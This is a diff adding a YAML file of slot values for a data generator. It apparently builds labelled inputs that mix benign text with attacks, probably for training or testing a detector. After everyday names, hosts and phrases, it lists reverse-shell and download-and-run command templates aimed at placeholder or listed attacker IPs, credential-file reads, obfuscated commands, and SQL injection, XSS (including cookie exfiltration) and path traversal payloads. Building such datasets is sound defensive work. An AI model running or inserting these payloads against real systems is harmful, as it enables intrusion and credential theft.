@@ -1,0 +1,98 @@
+# Slot values for data/generators/inputs.py. Add values freely; keep each list on-theme.
+# All values are written by the team (no third-party payload lists yet; see data/raw/LICENSES.md).
+
+hosts: [example.com, api.internal.lan, db-01.corp.local, mail.google.com, cdn.jsdelivr.net, 10.0.0.12, 8.8.8.8,
+        192.168.1.1, localhost, intranet, build-server-02, payments.prod.example.org, a.b-c.io, srv01, gw.local]
+first_names: [Aarav, Priya, John, Maria, Sean, Fatima, Chen, Olga, Rahul, Sneha, Mohammed, Ana, Liam, Zoe, Kiran]
+last_names: ["O'Brien", "D'Souza", Smith, Patel, Kumar, "O'Neil", Fernandes, Nguyen, Iyer, Garcia, "Mc'Donald", Shah, Khan]
+domains: [gmail.com, outlook.com, corp.example.com, yahoo.co.in, proton.me, company.org]
+words: [invoice, report, quarterly, budget, meeting, notes, laptop, charger, order, refund, delivery, shipment,
+        password reset, login issue, printer, vpn, wifi, monitor, keyboard, salary slip, leave request, travel]
+phrases: ["where is my order", "Q3 report; final version", "R&D budget 2026", "pages 3--5", "tom & jerry",
+          "select a date", "union bank of india", "drop-off point near gate 2", "script for the meeting",
+          "can't login since monday", "it's not working!!", "price < 500 and > 100", "50% off | today only",
+          "use a;b;c as tags", "C:\\Users\\priya\\Documents", "../ (parent folder) explained", "what is 2+2",
+          "or else", "1=1 in maths", "SELECT your plan", "alert the team", "rm old files please", "cat pictures",
+          "id card lost", "who am i", "eval form for intern", "<b>bold</b> text help", "echo chamber article"]
+paths: [/home, /api/v1/orders, /static/app.js, /images/logo.png, /docs/getting-started, /reports/2026/q3.pdf,
+        /admin, /login, /search, /assets/css/site.css]
+json_snippets: ['{"id": 42}', '{"name": "Priya", "age": 31}', '[1, 2, 3]', '{"q": "laptop", "page": 2}']
+# Everyday English words that also occur in attacks; normal text must contain them so they don't look evil alone.
+risky_words: [select, union, drop, insert, order, by, or, and, script, alert, eval, exec, bash, shell, cat, id, sleep,
+              wait, delay, echo, import, base, file, root, admin, password, sudo, kill, rm, curl, ping, from, where,
+              table, having, like, null, update, delete, show, version, user, home, etc, system, run, test, who, am, i,
+              tail, head, find, grep, list, top, ps, set, get, post, style, link, frame, image, source, java, python]
+plain_words: [the, my, a, please, help, with, for, new, old, today, tomorrow, team, office, customer, account, issue,
+              problem, request, update, about, need, how, to, can, not, is, of, in, "on", at, near, best, cheap, guide,
+              blue, red, small, large, report, plan, notes, chapter, menu, recipe, music, movie, party, class, course]
+companies: [Acme Ltd, "R&D", Tata Steel, "Smith & Sons", "O'Reilly Media", "AT&T", "Johnson & Johnson", "Barnes & Noble"]
+filenames: [report_final(2).pdf, IMG_2041.JPG, budget-2026.xlsx, notes.txt, "resume (1).docx", backup.tar.gz, data.csv,
+            "invoice #233.pdf", main.py, index.html]
+password_chars: ["!", "@", "#", "$", "%", "&", "*", ";", "'", "-", "_", "=", "+", "?", "."]
+tlds: [com, in, org, net, io, local, lan, corp, dev]
+
+# --- attack building blocks ---
+cmd_separators: [";", "&&", "||", "|", "\n", "%0a", "`", "$("]
+recon_cmds: [id, whoami, uname -a, hostname, cat /etc/passwd, cat /etc/os-release, ls -la /, ps aux, netstat -tulpn,
+             ifconfig, ip a, env, pwd, cat /proc/version, ls /home]
+cred_cmds: [cat ~/.aws/credentials, cat /etc/shadow, cat .env, cat ~/.ssh/id_rsa, grep -ri password /var/www,
+            find / -name "*.kube*" 2>/dev/null, cat /root/.bash_history, printenv]
+dl_cmds: ["wget http://{ip}/x.sh -O /tmp/x.sh", "curl -s http://{ip}/s | sh", "curl http://{ip}:8000/a.sh | bash",
+          "busybox wget http://{ip}/b -O /tmp/b; chmod +x /tmp/b; /tmp/b", "tftp -g -r m {ip}",
+          "python3 -c 'import urllib.request;urllib.request.urlretrieve(\"http://{ip}/p\",\"/tmp/p\")'"]
+revshell_cmds: ["bash -i >& /dev/tcp/{ip}/4444 0>&1", "nc -e /bin/sh {ip} 9001", "nc {ip} 4444 -e /bin/bash",
+                "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {ip} 1234 >/tmp/f",
+                "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",4242))'"]
+obf_cmds: ["echo {b64} | base64 -d | sh", "echo {b64}|base64 -d|bash", "eval $(echo {b64} | base64 -d)",
+           "printf '\\x69\\x64' | sh", "$(echo aWQ= | base64 -d)"]
+# Generic shell verbs + args, combined at random (the "misc" command group).
+shell_verbs: [ls, cat, head, tail, touch, rm -f, mkdir -p, cp, mv, chmod +x, chmod 777, kill -9, sleep, ping -c 3,
+              nslookup, dig, host, tar czf, zip -r, crontab -l, sh -c, perl -e, php -r, ruby -e, echo, tee, uname -r,
+              df -h, mount, sudo -l, getent passwd, last, w, lsof -i, ss -tunap]
+shell_args: [/tmp/x, /etc/hosts, /var/www, /home/deploy, ~/.bashrc, "1", "10", attacker.test, evil.example, "'print 1'",
+             /tmp/a.tgz /home, "pwned > /tmp/p", /etc/crontab, /root, /var/log/syslog]
+attacker_ips: [10.66.0.23, 45.33.32.156, 185.220.101.4, 192.0.2.10, 203.0.113.7]
+b64_blobs: [Y2F0IC9ldGMvcGFzc3dk, d2hvYW1pO2lk, Y3VybCBodHRwOi8vMTAuMC4wLjEvcyB8IHNo, aWQ7dW5hbWUgLWE=]
+
+sqli_payloads:
+  tautology: ["' OR '1'='1", "' or 1=1--", "\" OR \"\"=\"", "admin' --", "' OR 'a'='a' #", "1' or '1'='1' -- -",
+              "') or ('1'='1", "' OR 1=1 LIMIT 1;--", "x' OR 'x'='x"]
+  union: ["' UNION SELECT NULL--", "1 UNION SELECT username, password FROM users--",
+          "' union all select 1,2,3,version()-- -", "-1 UNION SELECT table_name,2 FROM information_schema.tables--",
+          "0 union select load_file('/etc/passwd')"]
+  stacked: ["1; DROP TABLE users--", "'; EXEC xp_cmdshell('dir')--", "1; INSERT INTO admins VALUES('x','y')--",
+            "'; UPDATE users SET role='admin' WHERE '1'='1"]
+  time: ["1' AND SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--", "1) AND pg_sleep(5)--",
+         "' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--", "1 AND BENCHMARK(5000000,MD5(1))"]
+  comment: ["admin'/**/OR/**/1=1#", "1'/**/UNION/**/SELECT/**/1,2--", "' oR/**/'1'/**/=/**/'1",
+            "1%27%20or%201%3D1--"]
+  error: ["' AND extractvalue(1,concat(0x7e,version()))--", "' AND 1=CONVERT(int,@@version)--",
+          "' AND updatexml(1,concat(0x7e,user()),1)--"]
+  probe: ["1' ORDER BY 1--", "1' ORDER BY 5-- -", "' GROUP BY 1,2--", "1 ORDER BY 10#", "' HAVING 1=1 --",
+          "1' AND 1=1--", "1' AND 1=2--", "1 AND 1=1", "' AND 'x'='x", "{user}'#", "{user}'--", "{user}' /*"]
+  blind: ["1' AND SUBSTRING(@@version,1,1)='5'--", "1 AND ASCII(SUBSTR((SELECT user()),1,1))>100",
+          "' AND (SELECT COUNT(*) FROM users)>0--", "1' AND LENGTH(database())>3--", "' OR EXISTS(SELECT 1 FROM admin)--"]
+
+xss_payloads:
+  script: ["<script>alert(1)</script>", "<script>alert(document.cookie)</script>", "<ScRiPt>fetch('//x.io?c='+document.cookie)</sCrIpT>",
+           "\"><script>alert('x')</script>", "</title><script>alert(1)</script>"]
+  handler: ["<img src=x onerror=alert(1)>", "<svg onload=alert(1)>", "<body onload=alert('xss')>",
+            "\" autofocus onfocus=alert(1) x=\"", "<iframe src=javascript:alert(1)>", "<details open ontoggle=alert(1)>"]
+  url: ["javascript:alert(1)", "JaVaScRiPt:alert(document.domain)", "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+        "javascript://%0aalert(1)"]
+  misc: ["<a href=\"javascript:alert(1)\">x</a>", "<math><mtext></mtext><img src=x onerror=alert(1)></math>",
+         "'-alert(1)-'", "{{constructor.constructor('alert(1)')()}}", "<input onmouseover=alert(1)>"]
+  tags: ["<link rel=stylesheet href=//{evil}/s.css>", "<meta http-equiv=refresh content=0;url=//{evil}>",
+         "<base href=//{evil}/>", "<style>body{background:url(//{evil}/x)}</style>", "<object data=//{evil}/x.swf>",
+         "<embed src=//{evil}/e>", "<script src=//{evil}/a.js></script>", "<iframe src=//{evil}></iframe>",
+         "<form action=//{evil}/steal><input name=p>"]
+
+traversal_payloads:
+  dotdot: ["../../../../etc/passwd", "../../../etc/shadow", "..\\..\\..\\windows\\win.ini", "../../../../../../proc/self/environ",
+           "../../app/config/database.yml", "../../../var/log/auth.log", "../.env", "../../../../root/.ssh/id_rsa"]
+  encoded: ["%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "..%2f..%2f..%2fetc%2fpasswd", "%252e%252e%252fetc%252fpasswd",
+            "..%5c..%5c..%5cwindows%5cwin.ini", "%2e%2e/%2e%2e/etc/hosts"]
+  tricks: ["....//....//....//etc/passwd", "..././..././etc/passwd", "/etc/passwd%00.png", "....\\\\....\\\\boot.ini",
+           "file:///etc/passwd", "/var/www/../../etc/passwd"]
+  absolute: ["/etc/passwd", "/etc/shadow", "C:\\Windows\\System32\\drivers\\etc\\hosts", "/proc/self/cmdline",
+             "C:/boot.ini"]
